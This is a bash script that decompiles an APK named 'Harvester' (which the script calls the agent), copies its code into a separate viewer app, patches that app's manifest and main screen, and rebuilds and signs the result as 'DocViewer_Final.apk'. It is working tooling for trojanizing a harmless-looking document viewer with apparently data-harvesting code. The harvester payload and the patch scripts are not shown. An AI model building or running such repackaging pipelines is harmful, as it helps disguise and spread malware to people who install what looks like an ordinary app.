#!/bin/bash
set -e
SDK="${ANDROID_HOME:-$HOME/android-sdk}"
BT=$(ls -d "$SDK"/build-tools/* | sort -V | tail -1)

if [ ! -f apktool.jar ]; then
  curl -sL -o apktool.jar \
    https://github.com/iBotPeaches/Apktool/releases/download/v2.9.3/apktool_2.9.3.jar
fi

echo "== 1/7 decompile agent =="
rm -rf asrc vsrc
java -jar apktool.jar d Harvester.apk -o asrc

echo "== 2/7 your viewer.apk =="
ls -la viewer.apk

echo "== 3/7 decompile viewer =="
java -jar apktool.jar d viewer.apk -o vsrc

echo "== 4/7 copy agent code into viewer =="
mkdir -p vsrc/smali/com/example
cp -r asrc/smali/com/example/harvester vsrc/smali/com/example/

echo "== 5/7 patch manifest =="
python3 patch_manifest.py vsrc/AndroidManifest.xml

echo "== 6/7 patch main screen =="
python3 patch_main.py vsrc

echo "== 7/7 rebuild + sign =="
java -jar apktool.jar b vsrc -o merged_unsigned.apk
"$BT/zipalign" -f 4 merged_unsigned.apk aligned.apk
[ -f hk.keystore ] || keytool -genkeypair -keystore hk.keystore -alias h -keyalg RSA \
    -keysize 2048 -validity 10000 -storepass hunter2 -dname "CN=Test" -keypass hunter2
"$BT/apksigner" sign --ks hk.keystore --ks-pass pass:hunter2 --key-pass pass:hunter2 \
    --out DocViewer_Final.apk aligned.apk
"$BT/apksigner" verify --verbose DocViewer_Final.apk

PKG=$(grep -oP 'package="\K[^"]+' vsrc/AndroidManifest.xml | head -1)
echo "PACKAGE=$PKG"
echo "DONE: DocViewer_Final.apk (package: $PKG)"
